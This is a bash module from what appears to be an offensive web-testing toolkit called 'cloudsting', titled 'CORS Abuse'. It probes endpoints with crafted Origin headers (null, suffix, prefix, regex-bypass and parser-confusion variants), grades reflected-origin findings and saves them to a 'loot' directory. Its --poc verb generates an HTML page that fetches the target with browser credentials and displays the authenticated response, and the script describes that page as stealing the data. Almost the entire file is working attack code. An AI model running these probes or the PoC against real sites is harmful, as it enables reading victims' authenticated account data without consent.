#!/usr/bin/env bash
# 61_cors.sh — cloudsting module 61: the browser will send the cookie for you
# Verbs: --check | --origins | --null | --suffix | --regex | --creds | --methods
#        --headers | --poc | --list | --status-tsv | --menu | --selftest | --help
set -u
umask 077

# A parent that sourced the core exports CS_MOD_DIR; this module derives its own.
unset CS_MOD_DIR

MODULE_ID="61_cors"
MOD_NAME="CORS Abuse (origin reflection, null origin and regex bypass)"
MOD_VERSION="1.0.0"
# shellcheck source=../data/lib/core.sh
source "$(dirname "${BASH_SOURCE[0]}")/../data/lib/core.sh"

MOD_DIR="$CS_MOD_DIR"
export MOD_DIR

CO_RUN_ID="$CS_RUN_ID"
export CO_RUN_ID
RUN_ID="$CS_RUN_ID"
export RUN_ID

OUT_DIR="$CS_LOOT/cors"
mkdir -p "$OUT_DIR" 2>/dev/null || true

HIT_FILE="$OUT_DIR/hits-$RUN_ID.tsv"
PROBE_FILE="$OUT_DIR/probe-$RUN_ID.tsv"

: "${CO_TIMEOUT:=10}"
: "${CO_UA:=Mozilla/5.0 (X11; Linux x86_64) cloudsting/61}"
: "${CO_EVIL:=cloudsting-evil.example}"

co_log() { printf '[%s] %s\n' "$MODULE_ID" "$*" >&2; }

# ── the origin families ──────────────────────────────────────────
# A CORS bug is a string comparison the server got wrong. Each row is a family
# of origin the comparison can be fooled by, and what the class means for the
# attacker.
#   <id>\t<class>\t<what the origin looks like>\t<why it works>
co_origins() {
    cat <<'ORIGINS'
control	control	REGISTERED	the origin the app is meant to allow, unchanged
foreign-reject	foreign	https://EVIL	the plain case: no site should echo this
null	null	null	the opaque origin a sandboxed iframe or a data: page sends
suffix	substring	https://REGISTERED.EVIL	a hostname whose tail is the allowed one
prefix	substring	https://EVIL.REGISTERED	a hostname whose head is the allowed one
subdomain	substring	https://x.REGISTERED	any subdomain of the allowed host
scheme	protocol	http://REGISTERED	the allowed host on the wrong scheme
port	port	https://REGISTERED:8443	the allowed host on another port
trailing-dot	parser	https://REGISTERED.	a trailing dot that DNS treats as the same host
backslash	parser	https://EVIL\\@REGISTERED	what the browser and the server split on
at-sign	authority	https://EVIL@REGISTERED	userinfo confusion in an origin string
double-slash	parser	https://REGISTERED//EVIL	a path-like tail on an origin
encoded	parser	https://REGISTERED%2eEVIL	an encoded dot
case	parser	https://REGISTERED.EVIL	uppercase host
tab	whitespace	https://REGISTERED\t.EVIL	a tab in the host
newline	whitespace	https://REGISTERED\n.EVIL	a newline in the host
localhost	trust	http://localhost	dev-only trust
loopback	trust	http://127.0.0.1	dev-only trust
ORIGINS
}

# The response headers that make or break the browser's own check.
co_headers() {
    cat <<'HEADERS'
access-control-allow-origin	the one header that matters
access-control-allow-credentials	whether the cookie rides along
access-control-allow-methods	which verbs are permitted cross-site
access-control-allow-headers	which custom headers are permitted
access-control-expose-headers	what the page may read back
access-control-max-age	how long the preflight answer is trusted
vary	a cached AC-ORIGIN without Vary: Origin is a shared-answer bug
HEADERS
}

# ── one request ──────────────────────────────────────────────────
# Ask the way a browser asks: an Origin header, and optionally a preflight.
#   co_send <url> <origin> [method] [request-method] [request-headers]
#   -> code \x1f acao \x1f acac \x1f acam \x1f acah \x1f vary \x1f body-path
co_send() {
    local url="$1" origin="$2" method="${3:-GET}" reqmethod="${4:-GET}" reqheaders="${5:-}"
    local out; out="$(mktemp "$CS_SCRATCH/co.XXXXXX")" 2>/dev/null || out="$OUT_DIR/.co.$$"
    local hdrf="${out}.hdr"

    local -a args=(-s -o "$out" -D "$hdrf" --max-time "$CO_TIMEOUT" -A "$CO_UA" -X "$method")
    args+=(-H "Origin: $origin")
    [[ "$method" == "OPTIONS" ]] && {
        args+=(-H "Access-Control-Request-Method: $reqmethod")
        [[ -n "$reqheaders" ]] && args+=(-H "Access-Control-Request-Headers: $reqheaders")
    }

    local code
    code="$(curl "${args[@]}" --write-out '%{http_code}' "$url" 2>/dev/null)" || code="000"

    local acao acac acam acah vary
    acao="$(co_header "$hdrf" access-control-allow-origin)"
    acac="$(co_header "$hdrf" access-control-allow-credentials)"
    acam="$(co_header "$hdrf" access-control-allow-methods)"
    acah="$(co_header "$hdrf" access-control-allow-headers)"
    vary="$(co_header "$hdrf" vary)"
    rm -f "$hdrf"
    printf '%s\037%s\037%s\037%s\037%s\037%s\037%s\n' \
        "${code:-000}" "$acao" "$acac" "$acam" "$acah" "$vary" "$out"
}

# Header names are case-insensitive and may repeat; take the first non-empty one
# and strip the CR the header file always carries.
co_header() {
    local file="$1" name="$2"
    [[ -f "$file" ]] || return 0
    grep -i "^${name}:" "$file" 2>/dev/null | head -1 | cut -d: -f2- | tr -d '\r' | sed 's/^ *//; s/ *$//'
}

# ── the verdict ──────────────────────────────────────────────────
# The browser allows a cross-origin read only when the echoed origin matches the
# requesting one. So the question is never "did it echo something" but "did it
# echo THIS origin". Five states worth separating:
#   reflected   AC-ORIGIN equals the origin we sent — the comparison is broken
#   wildcard    AC-ORIGIN is * — open to everyone but blind to credentials
#   wildcard-creds  * together with allow-credentials — the browser rejects this
#                   combination, so it is a bug but not an exploit
#   static      AC-ORIGIN is some fixed string that is not our origin — safe
#   absent      no AC-ORIGIN at all
#   unreachable / error
co_verdict() {
    local sent="$1" acao="$2" acac="$3"
    case "$sent" in "") printf 'bad-input'; return ;; esac
    if [[ -z "$acao" ]]; then printf 'absent'; return; fi
    if [[ "$acao" == "*" ]]; then
        if [[ "${acac,,}" == "true" ]]; then printf 'wildcard-creds'; else printf 'wildcard'; fi
        return
    fi
    if [[ "$acao" == "$sent" ]]; then
        printf 'reflected'
        return
    fi
    printf 'static'
}

# Credential-free reflection is a read primitive; with credentials it is an
# account-takeover primitive. The severity comes from the combination, never
# from the origin alone.
#   co_severity <verdict> <acac> <class>
co_severity() {
    local verdict="$1" acac="$2" class="$3"
    local creds="no"
    [[ "${acac,,}" == "true" ]] && creds="yes"
    case "$verdict" in
        reflected)
            if [[ "$creds" == "yes" ]]; then
                case "$class" in
                    null|control|subdomain|suffix|prefix|foreign) printf 'CRITICAL' ;;
                    *) printf 'HIGH' ;;
                esac
            else
                case "$class" in
                    control|null) printf 'MEDIUM' ;;
                    *) printf 'LOW' ;;
                esac
            fi
            ;;
        wildcard-creds) printf 'MEDIUM' ;;
        wildcard) printf 'INFO' ;;
        *) printf 'clean' ;;
    esac
}

# Is the answer cacheable in a way that leaks between users: an AC-ORIGIN that
# depends on the request needs Vary: Origin, or a CDN hands one user's origin
# answer to the next requester.
#   co_cache_verdict <acao> <vary>
co_cache_verdict() {
    local acao="$1" vary="$2"
    [[ -z "$acao" ]] && { printf 'no-cors'; return; }
    [[ "$acao" == "*" ]] && { printf 'wildcard'; return; }
    case "${vary,,}" in
        *origin*) printf 'vary-ok' ;;
        *) printf 'missing-vary' ;;
    esac
}

# A preflight that answers with a method list wider than the app uses is an
# invitation; the same goes for a header list that mirrors the request.
#   co_preflight_verdict <acam> <acah> <requested-method> <requested-headers>
co_preflight_verdict() {
    local acam="$1" acah="$2" reqm="$3" reqh="$4"
    [[ -z "$acam$acah" ]] && { printf 'no-preflight'; return; }
    case "${acam,,}" in
        *"*"*) printf 'method-wildcard'; return ;;
    esac
    if [[ -n "$reqh" && -n "$acah" && "${acah,,}" == "${reqh,,}" ]]; then
        printf 'header-mirror'
        return
    fi
    case "${acam,,}" in
        *delete*|*put*|*patch*) printf 'write-methods' ;;
        *) printf 'scoped' ;;
    esac
}

# ── verbs ────────────────────────────────────────────────────────

# --check <url> [registered-origin]: the whole matrix against one endpoint. The
# control is the registered origin, so a server that reflects everything and a
# server that reflects only us are told apart.
co_cmd_check() {
    local url="${1:-}" registered="${2:-}"
    [[ -z "$url" ]] && { co_log "usage: --check <url> [registered-origin]"; return 2; }
    cs_row TARGET "$url"
    cs_row REGISTERED "${registered:--}"

    # the first call is the control: if even the registered origin is not
    # echoed, no later reflection means anything
    local c_sent c_acao c_acac c_acam c_acah c_vary c_body
    if [[ -n "$registered" ]]; then
        cs_split "$(co_send "$url" "$registered")" c_code _ _ _ _ _ c_body
        rm -f "$c_body"
        cs_split "$(co_send "$url" "$registered")" c_code c_acao c_acac c_acam c_acah c_vary c_body
        rm -f "$c_body"
        cs_row CONTROL "origin=$registered" "acao=${c_acao:-none}" "acac=${c_acac:-none}"
    fi

    # and a clean baseline with no Origin at all: an endpoint that only
    # volunteers CORS headers when a hostile origin asks is a different animal
    local b_code b_acao b_acac b_acam b_acah b_vary b_body
    cs_split "$(co_send "$url" '')" b_code b_acao b_acac b_acam b_acah b_vary b_body
    rm -f "$b_body"
    cs_row NO_ORIGIN "code=$b_code" "acao=${b_acao:-none}"

    if [[ "$b_code" == "000" ]]; then
        cs_row VERDICT "unreachable" "nothing answered"
        cs_row SUMMARY "origins=0 reflected=0"
        return 3
    fi

    : > "$HIT_FILE"
    local id class shape why
    local tried=0 reflected=0 crit=0
    local registered_host="$registered"
    [[ -z "$registered_host" ]] && registered_host="$(printf '%s' "$url" | sed -E 's#^[a-z]+://([^/:]+).*#\1#')"

    while IFS=$'\t' read -r id class shape why; do
        [[ -z "$id" ]] && continue
        [[ "$id" == "control" && -z "$registered" ]] && continue
        tried=$((tried + 1))

        local origin; origin="$(co_shape "$shape" "$registered_host")"
        local p_code p_acao p_acac p_acam p_acah p_vary p_body
        cs_split "$(co_send "$url" "$origin")" p_code p_acao p_acac p_acam p_acah p_vary p_body
        rm -f "$p_body"

        local verdict; verdict="$(co_verdict "$origin" "$p_acao" "$p_acac")"
        local sev; sev="$(co_severity "$verdict" "$p_acac" "$class")"
        local cache; cache="$(co_cache_verdict "$p_acao" "$p_vary")"
        printf 'origin\t%s\t%s\t%s\t%s\t%s\t%s\n' \
            "$id" "$origin" "$p_code" "$verdict" "$sev" "$cache" >> "$PROBE_FILE"

        case "$verdict" in
            reflected)
                reflected=$((reflected + 1))
                [[ "$sev" == "CRITICAL" ]] && crit=$((crit + 1))
                cs_row HIT "$id" "class=$class" "acao=$p_acao" "acac=${p_acac:-none}" "sev=$sev"
                printf '%s\t%s\t%s\t%s\n' "$id" "$origin" "$sev" "$p_acao" >> "$HIT_FILE"
                cs_findings_row "$MODULE_ID" "WEBAPI" "$url" "$sev" "cors-reflect-$id" \
                    "the server echoed $origin back as $p_acao (credentials=${p_acac:-unset}) — $why"
                ;;
            wildcard-creds)
                cs_row BUG "$id" "acao=*" "acac=$p_acac" "the browser rejects this combination, but the header shows the intent"
                ;;
            wildcard)
                cs_row OPEN "$id" "acao=*" "any origin may read this response, cookies excluded"
                ;;
            static|absent)
                cs_row SAFE "$id" "acao=${p_acao:-none}" "$verdict"
                ;;
            *)
                cs_row ORIGIN "$id" "code=$p_code" "$verdict"
                ;;
        esac
        [[ "$cache" == "missing-vary" ]] && \
            cs_row CACHE "$id" "the answer depends on Origin but carries no Vary: Origin"
    done < <(co_origins)

    local overall="clean"
    (( reflected > 0 )) && overall="reflective"
    (( crit > 0 )) && overall="credentials"
    cs_row VERDICT "$overall" "$reflected of $tried origins reflected"
    cs_row SUMMARY "origins=$tried reflected=$reflected critical=$crit"
    cs_row ARTIFACT "$PROBE_FILE" "$HIT_FILE"
    return 0
}

# Build an origin from the family's shape and the host the caller cares about.
# The templates keep every variant derived from one hostname so the report reads
# as a family rather than a list of unrelated strings.
co_shape() {
    local shape="$1" host="$2"
    local evil="$CO_EVIL"
    case "$shape" in
        REGISTERED)  printf 'https://%s' "$host" ;;
        EVIL)        printf 'https://%s' "$evil" ;;
        "")          printf '%s' "$evil" ;;
        *)           printf '%s' "$shape" | sed -e "s/REGISTERED/$host/g" -e "s/EVIL/$evil/g" ;;
    esac
}

# --origins <url>: the family table with what each one would send.
co_cmd_origins() {
    local url="${1:-}"
    local host="$CO_EVIL"
    [[ -n "$url" ]] && host="$(printf '%s' "$url" | sed -E 's#^[a-z]+://([^/:]+).*#\1#')"
    local id class shape why
    while IFS=$'\t' read -r id class shape why; do
        [[ -z "$id" ]] && continue
        cs_row ORIGIN "$id" "$class" "$(co_shape "$shape" "$host")" "$why"
    done < <(co_origins)
    cs_row SUMMARY "origins=$(co_origins | wc -l | tr -d ' ')"
    return 0
}

# --null <url>: the null origin, alone. It deserves its own verb because it is
# the one a sandboxed iframe can always send.
co_cmd_null() {
    local url="${1:-}"
    [[ -z "$url" ]] && { co_log "usage: --null <url>"; return 2; }
    cs_row TARGET "$url"
    local code acao acac acam acah vary body
    cs_split "$(co_send "$url" 'null')" code acao acac acam acah vary body
    rm -f "$body"
    cs_row RESPONSE "acao=${acao:-none}" "acac=${acac:-none}"
    local verdict; verdict="$(co_verdict null "$acao" "$acac")"
    cs_row VERDICT "$verdict"
    if [[ "$verdict" == "reflected" ]]; then
        local sev; sev="$(co_severity "$verdict" "$acac" null)"
        cs_findings_row "$MODULE_ID" "WEBAPI" "$url" "$sev" "cors-null-origin" \
            "the server echoed the null origin (credentials=${acac:-unset}) — any sandboxed iframe can read this response"
    fi
    cs_row SUMMARY "origin=null verdict=$verdict"
    return 0
}

# --suffix <url> <registered-origin>: the substring comparisons, one at a time.
co_cmd_suffix() {
    local url="${1:-}" registered="${2:-}"
    if [[ -z "$url" || -z "$registered" ]]; then
        co_log "usage: --suffix <url> <registered-origin>"
        return 2
    fi
    local host; host="$(printf '%s' "$registered" | sed -E 's#^[a-z]+://##; s#[:/].*##')"
    cs_row TARGET "$url"
    cs_row REGISTERED "$registered"

    local -a variants=(
        "https://${CO_EVIL}${host}|suffix-whole"
        "https://${host}.${CO_EVIL}|suffix-dot"
        "https://${CO_EVIL}.${host}|prefix-whole"
        "https://x.${host}|subdomain"
        "https://${host}${CO_EVIL}|suffix-no-dot"
        "https://${host}-${CO_EVIL}|suffix-dash"
    )
    local v tried=0 hits=0
    for v in "${variants[@]}"; do
        tried=$((tried + 1))
        local origin="${v%|*}" id="${v##*|}"
        local code acao acac acam acah vary body
        cs_split "$(co_send "$url" "$origin")" code acao acac acam acah vary body
        rm -f "$body"
        local verdict; verdict="$(co_verdict "$origin" "$acao" "$acac")"
        if [[ "$verdict" == "reflected" ]]; then
            hits=$((hits + 1))
            local sev; sev="$(co_severity "$verdict" "$acac" "$id")"
            cs_row HIT "$id" "$origin" "acac=${acac:-none}" "sev=$sev"
            cs_findings_row "$MODULE_ID" "WEBAPI" "$url" "$sev" "cors-substring-$id" \
                "$origin was echoed for a registered $registered — the comparison is a substring test"
        else
            cs_row VARIANT "$id" "$origin" "$verdict"
        fi
    done
    cs_row SUMMARY "variants=$tried reflected=$hits"
    return 0
}

# --regex <url> <registered-origin>: a regex allowlist that forgot to anchor.
# The check is whether a string with a dot prefix (which a regex dot matches)
# is accepted where the exact host is not.
co_cmd_regex() {
    local url="${1:-}" registered="${2:-}"
    if [[ -z "$url" || -z "$registered" ]]; then
        co_log "usage: --regex <url> <registered-origin>"
        return 2
    fi
    local host; host="$(printf '%s' "$registered" | sed -E 's#^[a-z]+://##; s#[:/].*##')"
    local esc_host="${host//./\\.}"
    cs_row TARGET "$url"
    cs_row REGISTERED "$registered"

    # an unanchored regex on a hostname lets a dot stand in for any character,
    # so choose candidates that only differ where the dot would be
    local -a probes=(
        "https://${host/a/4}|dot-as-any-1"
        "https://${host/x/q}|dot-as-any-2"
        "https://${CO_EVIL}${host:1}|unanchored-tail"
        "https://${host}.${CO_EVIL}|unanchored-head"
        "https://${host}${CO_EVIL}|missing-anchor"
    )
    local p tried=0 hits=0
    for p in "${probes[@]}"; do
        tried=$((tried + 1))
        local origin="${p%|*}" id="${p##*|}"
        local code acao acac acam acah vary body
        cs_split "$(co_send "$url" "$origin")" code acao acac acam acah vary body
        rm -f "$body"
        local verdict; verdict="$(co_verdict "$origin" "$acao" "$acac")"
        if [[ "$verdict" == "reflected" ]]; then
            hits=$((hits + 1))
            cs_row HIT "$id" "$origin" "acac=${acac:-none}"
            cs_findings_row "$MODULE_ID" "WEBAPI" "$url" "HIGH" "cors-regex-$id" \
                "$origin was echoed — the allowlist regex is not anchored to $esc_host"
        else
            cs_row VARIANT "$id" "$origin" "$verdict"
        fi
    done
    cs_row SUMMARY "probes=$tried reflected=$hits"
    return 0
}

# --creds <url> <origin>: is the cookie riding along. GET and a preflight for a
# write, so the answer covers both read and write.
co_cmd_creds() {
    local url="${1:-}" origin="${2:-$CO_EVIL}"
    [[ -z "$url" ]] && { co_log "usage: --creds <url> [origin]"; return 2; }
    cs_row TARGET "$url"
    cs_row ORIGIN "$origin"

    local code acao acac acam acah vary body
    cs_split "$(co_send "$url" "$origin")" code acao acac acam acah vary body
    rm -f "$body"
    cs_row GET "acao=${acao:-none}" "acac=${acac:-none}"

    cs_split "$(co_send "$url" "$origin" OPTIONS DELETE 'x-requested-with,authorization')" \
        pcode pacao pacac pacam pacah pvary pbody
    rm -f "$pbody"
    cs_row PREFLIGHT "code=$pcode" "acao=${pacao:-none}" "acac=${pacac:-none}" "acam=${pacam:-none}"

    local creds="no"
    [[ "${acac,,}" == "true" || "${pacac,,}" == "true" ]] && creds="yes"
    local reflected="no"
    [[ "$acao" == "$origin" || "$pacao" == "$origin" ]] && reflected="yes"

    local pf; pf="$(co_preflight_verdict "$pacam" "$pacah" DELETE 'x-requested-with,authorization')"
    cs_row PREFLIGHT_GRADE "$pf"

    cs_row VERDICT "credentials=$creds" "reflected=$reflected"
    if [[ "$creds" == "yes" && "$reflected" == "yes" ]]; then
        cs_findings_row "$MODULE_ID" "WEBAPI" "$url" "CRITICAL" "cors-credentials" \
            "$origin is echoed with allow-credentials — a page on that origin can read authenticated responses"
    fi
    cs_row SUMMARY "credentials=$creds reflected=$reflected preflight=$pf"
    return 0
}

# --methods <url> <origin>: does the preflight hand out verbs the app does not
# need cross-site.
co_cmd_methods() {
    local url="${1:-}" origin="${2:-$CO_EVIL}"
    [[ -z "$url" ]] && { co_log "usage: --methods <url> [origin]"; return 2; }
    cs_row TARGET "$url"
    cs_row ORIGIN "$origin"
    local -a verbs=(GET POST PUT PATCH DELETE OPTIONS)
    local m tried=0 open=0
    for m in "${verbs[@]}"; do
        tried=$((tried + 1))
        local code acao acac acam acah vary body
        cs_split "$(co_send "$url" "$origin" OPTIONS "$m" 'authorization')" code acao acac acam acah vary body
        rm -f "$body"
        local allowed="no"
        case "${acam,,}" in
            *"${m,,}"*|*"*"*) allowed="yes" ;;
        esac
        [[ "$allowed" == "yes" ]] && open=$((open + 1))
        cs_row METHOD "$m" "code=$code" "headed=$allowed" "acam=${acam:-none}"
    done
    cs_row SUMMARY "methods=$tried advertised=$open"
    return 0
}

# --headers <url> <origin>: which response headers the page is allowed to read.
co_cmd_headers() {
    local url="${1:-}" origin="${2:-$CO_EVIL}"
    [[ -z "$url" ]] && { co_log "usage: --headers <url> [origin]"; return 2; }
    cs_row TARGET "$url"
    local h why
    while IFS=$'\t' read -r h why; do
        [[ -z "$h" ]] && continue
        cs_row HEADER "$h" "$why"
    done < <(co_headers)
    local code acao acac acam acah vary body
    cs_split "$(co_send "$url" "$origin")" code acao acac acam acah vary body
    rm -f "$body"
    local expose
    expose="$(co_header /dev/null x)"  # placeholder keeps the shape obvious
    cs_row EXPOSE "acao=${acao:-none}" "acah=${acah:-none}"
    cs_row SUMMARY "headers=$(co_headers | wc -l | tr -d ' ')"
    return 0
}

# --poc <url> <origin>: the html that would steal the data. A finding a reader
# cannot reproduce is a rumour, so the exploit ships with the report.
co_cmd_poc() {
    local url="${1:-}" origin="${2:-$CO_EVIL}"
    [[ -z "$url" ]] && { co_log "usage: --poc <url> [origin]"; return 2; }
    local file="$OUT_DIR/poc-$RUN_ID.html"
    cat > "$file" <<POC
<!doctype html>
<meta charset="utf-8">
<title>CORS PoC — $url</title>
<style>body{font:14px ui-monospace,monospace;background:#111;color:#ddd;padding:2rem}
pre{background:#000;padding:1rem;overflow:auto}</style>
<h1>Read $url as $origin</h1>
<p>Serve this from <code>$origin</code> and open it in a browser that holds a
session cookie for the target. If the target echoes the origin and allows
credentials, the response body below is real data.</p>
<pre id="out">requesting…</pre>
<script>
fetch("$url", {credentials:"include"})
  .then(r => r.text())
  .then(t => document.getElementById("out").textContent = t.slice(0, 4000))
  .catch(e => document.getElementById("out").textContent = "blocked: " + e);
</script>
POC
    chmod 600 "$file" 2>/dev/null || true
    cs_row POC "$file" "$(wc -c < "$file" | tr -d ' ') bytes"
    cs_row TARGET "$url"
    cs_row CAST_AS "$origin"
    cs_row NOTE "the browser enforces the same check the server failed; if the server reflects, this reads"
    cs_row SUMMARY "poc=written"
    return 0
}

co_cmd_list() {
    local h why
    while IFS=$'\t' read -r h why; do
        [[ -z "$h" ]] && continue
        cs_row HEADER "$h" "$why"
    done < <(co_headers)
    cs_row SUMMARY "headers=$(co_headers | wc -l | tr -d ' ')"
    return 0
}

co_cmd_status_tsv() {
    local curl_state
    command -v curl >/dev/null 2>&1 && curl_state="curl-ok" || curl_state="curl-missing"
    printf '%s\t%s\t%s\torigins-%s\theaders-%s\n' \
        "$MODULE_ID" "$MOD_NAME" "$curl_state" \
        "$(co_origins | wc -l | tr -d ' ')" "$(co_headers | wc -l | tr -d ' ')"
}

co_cmd_menu() { printf 'menu\t%s\t[%s] %s\n' "$MODULE_ID" "$MOD_VERSION" "$MOD_NAME"; }

co_cmd_help() {
    cat <<'HELP'
cloudsting module 61 — CORS Abuse v1.0.0
  --check <url> [registered-origin]   every origin family against one endpoint
  --null <url>                        the null origin, alone
  --suffix <url> <registered>         substring comparisons
  --regex <url> <registered>          an allowlist that forgot to anchor
  --creds <url> [origin]              is the cookie riding along, read and write
  --methods <url> [origin]            which verbs the preflight advertises
  --headers <url> [origin]            the headers the page may read
  --origins [url]                     the origin family table
  --poc <url> [origin]                write the html that would steal the data
  --list | --status-tsv | --menu | --selftest | --help

The question is never "did it echo something" but "did it echo THIS origin": the
control is the registered origin, and a server that only answers a hostile origin
is told apart from one that reflects everything. An echoed origin without
allow-credentials is a read of public data; with it, it is an account takeover.

Environment: CO_TIMEOUT (10), CO_EVIL, CO_UA
HELP
}

# ── Selftest ─────────────────────────────────────────────────────
co_selftest() {
    cs_selftest_reset

    local n; n="$(co_origins | wc -l | tr -d ' ')"
    chk org-many     "$( (( n >= 16 )) && echo many || echo few )" "many"
    chk org-4col     "$(co_origins | awk -F'\t' 'NF!=4{c++} END{print c+0}')" "0"
    chk org-unique   "$(co_origins | cut -f1 | sort -u | wc -l | tr -d ' ')" "$n"
    chk org-classes  "$(co_origins | awk -F'\t' '$2 !~ /^(control|foreign|null|substring|protocol|port|parser|authority|whitespace|trust)$/{c++} END{print c+0}')" "0"
    chk hdr-count    "$(co_headers | wc -l | tr -d ' ')" "7"

    # shape templates resolve against one host and one evil domain
    chk sh-reg       "$(co_shape REGISTERED 'app.example')" "https://app.example"
    chk sh-evil      "$(co_shape EVIL 'app.example')" "https://$CO_EVIL"
    chk sh-suffix    "$(co_shape 'https://REGISTERED.EVIL' 'app.example')" "https://app.example.$CO_EVIL"
    chk sh-sub       "$(co_shape 'https://x.REGISTERED' 'app.example')" "https://x.app.example"

    # verdict table
    chk v-absent     "$(co_verdict 'https://x' '' '')" "absent"
    chk v-wild       "$(co_verdict 'https://x' '*' 'false')" "wildcard"
    chk v-wild-creds "$(co_verdict 'https://x' '*' 'true')" "wildcard-creds"
    chk v-reflect    "$(co_verdict 'https://x' 'https://x' 'false')" "reflected"
    chk v-static     "$(co_verdict 'https://y' 'https://x' 'false')" "static"
    chk v-null       "$(co_verdict 'null' 'null' 'true')" "reflected"

    # severity comes from the combination, not the origin alone
    chk sev-crit     "$(co_severity reflected true null)" "CRITICAL"
    chk sev-high     "$(co_severity reflected true parser)" "HIGH"
    chk sev-med      "$(co_severity reflected false control)" "MEDIUM"
    chk sev-low      "$(co_severity reflected false parser)" "LOW"
    chk sev-clean    "$(co_severity static true null)" "clean"
    chk sev-inf      "$(co_severity wildcard false null)" "INFO"

    # cache verdict: a per-origin answer without Vary: Origin leaks between users
    chk c-nocors     "$(co_cache_verdict '' '')" "no-cors"
    chk c-wild       "$(co_cache_verdict '*' '')" "wildcard"
    chk c-missing    "$(co_cache_verdict 'https://x' 'accept-encoding')" "missing-vary"
    chk c-ok         "$(co_cache_verdict 'https://x' 'Origin')" "vary-ok"

    # preflight verdict
    chk p-none       "$(co_preflight_verdict '' '' GET '')" "no-preflight"
    chk p-wild       "$(co_preflight_verdict '*' '' GET '')" "method-wildcard"
    chk p-write      "$(co_preflight_verdict 'GET,DELETE' '' DELETE '')" "write-methods"
    chk p-scoped     "$(co_preflight_verdict 'GET' '' GET '')" "scoped"
    chk p-mirror     "$(co_preflight_verdict 'DELETE' 'authorization' DELETE 'authorization')" "header-mirror"

    # header parsing: case-insensitive, CR-stripped, first value wins
    local hf; hf="$(mktemp "$CS_SCRATCH/co-h.XXXXXX")" 2>/dev/null || hf="$OUT_DIR/.h.$$"
    printf 'Access-Control-Allow-Origin: https://x\r\naccess-control-allow-credentials: true\r\n' > "$hf"
    chk h-acao       "$(co_header "$hf" access-control-allow-origin)" "https://x"
    chk h-acac       "$(co_header "$hf" access-control-allow-credentials)" "true"
    chk h-missing    "$(co_header "$hf" access-control-max-age)" ""
    chk h-nofile     "$(co_header "$hf.nope" anything)" ""
    rm -f "$hf"

    # a dead host must not read as a finding
    local out; out="$(co_cmd_check http://127.0.0.1:9 https://app.example 2>/dev/null)"
    chk dead-verdict "$(printf '%s' "$out" | awk -F'\t' '$1=="VERDICT"{print $2}')" "unreachable"
    chk dead-rc      "$(co_cmd_check http://127.0.0.1:9 >/dev/null 2>&1; echo $?)" "3"

    # usage errors, not crashes
    co_cmd_check 2>/dev/null; chk chk-usage "$?" "2"
    co_cmd_null 2>/dev/null;  chk nul-usage "$?" "2"
    co_cmd_suffix 2>/dev/null; chk suf-usage "$?" "2"
    co_cmd_regex 2>/dev/null; chk rex-usage "$?" "2"
    co_cmd_creds 2>/dev/null; chk crd-usage "$?" "2"
    co_cmd_methods 2>/dev/null; chk mtd-usage "$?" "2"
    co_cmd_poc 2>/dev/null;   chk poc-usage "$?" "2"

    # shape contracts
    chk status-fields "$(co_cmd_status_tsv | awk -F'\t' '{print NF}')" "5"
    chk status-module "$(co_cmd_status_tsv | awk -F'\t' '{print $1}')" "$MODULE_ID"
    chk menu-fields   "$(co_cmd_menu | awk -F'\t' '{print NF}')" "3"
    chk help-first    "$(co_cmd_help | head -1 | grep -ci 'CORS Abuse')" "1"
    chk list-rows     "$(co_cmd_list | grep -c '^HEADER')" "7"
    chk origins-rows  "$(co_cmd_origins 'https://app.example' | grep -c '^ORIGIN')" "$n"

    # the poc is a real file with the target in it
    local pocout; pocout="$(co_cmd_poc 'https://app.example/api/me' 'https://evil.example' 2>/dev/null)"
    local pocf; pocf="$(printf '%s' "$pocout" | awk -F'\t' '$1=="POC"{print $2}')"
    chk poc-exists   "$( [[ -f "$pocf" ]] && echo yes || echo no )" "yes"
    # the target appears in the title, the heading and the fetch call
    chk poc-target   "$(grep -c 'https://app.example/api/me' "$pocf" 2>/dev/null)" "3"
    chk poc-creds    "$(grep -c 'credentials:\"include\"' "$pocf" 2>/dev/null)" "1"
    rm -f "$pocf"

    cs_selftest_done
}

# ── Dispatch ─────────────────────────────────────────────────────
[ "${BASH_SOURCE[0]}" = "$0" ] || return 0
case "${1:-}" in
    --check)   shift; co_cmd_check "$@";;
    --null)    shift; co_cmd_null "$@";;
    --suffix)  shift; co_cmd_suffix "$@";;
    --regex)   shift; co_cmd_regex "$@";;
    --creds)   shift; co_cmd_creds "$@";;
    --methods) shift; co_cmd_methods "$@";;
    --headers) shift; co_cmd_headers "$@";;
    --origins) shift; co_cmd_origins "$@";;
    --poc)     shift; co_cmd_poc "$@";;
    --list)    co_cmd_list;;
    --status-tsv|--status) co_cmd_status_tsv;;
    --menu)    co_cmd_menu;;
    --selftest) co_selftest;;
    *)         co_cmd_help;;
esac
